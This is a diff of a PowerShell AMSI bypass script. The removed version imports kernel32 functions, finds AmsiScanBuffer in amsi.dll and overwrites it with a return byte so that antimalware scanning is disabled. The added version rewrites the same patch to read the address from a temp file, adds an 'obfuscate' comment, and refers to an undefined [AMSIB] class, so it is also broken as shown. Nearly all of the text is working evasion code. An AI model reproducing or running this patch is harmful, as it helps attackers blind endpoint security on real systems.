@@ -1,30 +1,15 @@
-# AMSI Bypass
-$s = @"
-using System;
-using System.Runtime.InteropServices;
-public class AmsiBypass {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
-Add-Type $s
+# Retrieve AMSI Function Address
+$FuncAddr = Get-Content "$env:TEMP\amsi_func.txt" -Encoding ASCII | ForEach-Object {[IntPtr]$_}
 
-$a = [AmsiBypass]::LoadLibrary("amsi.dll")
-$b = [AmsiBypass]::GetProcAddress($a, "AmsiScanBuffer")
-
-# Determine patch value based on architecture
-if ([IntPtr]::Size -eq 8) {
-    $p = 0xC3
+# Obfuscate the Patch
+$PatchValue = if ([IntPtr]::Size -eq 8) {
+    [byte]0xC3 # 64-bit architecture
 } else {
-    $p = 0x33
+    [byte]0x33 # 32-bit architecture
 }
 
-# Apply the patch to AMSI
-[void][AmsiBypass]::VirtualProtect($b, [uint32]1, 0x40, [ref]0)
-[System.Runtime.InteropServices.Marshal]::WriteByte($b, $p)
+# Modify AMSI Function
+[void][AMSIB]::VirtualProtect($FuncAddr, [UIntPtr]1, 0x40, [ref]0)
+[System.Runtime.InteropServices.Marshal]::WriteByte($FuncAddr, $PatchValue)
 
 Write-Host "[*] AMSI bypass successfully applied."
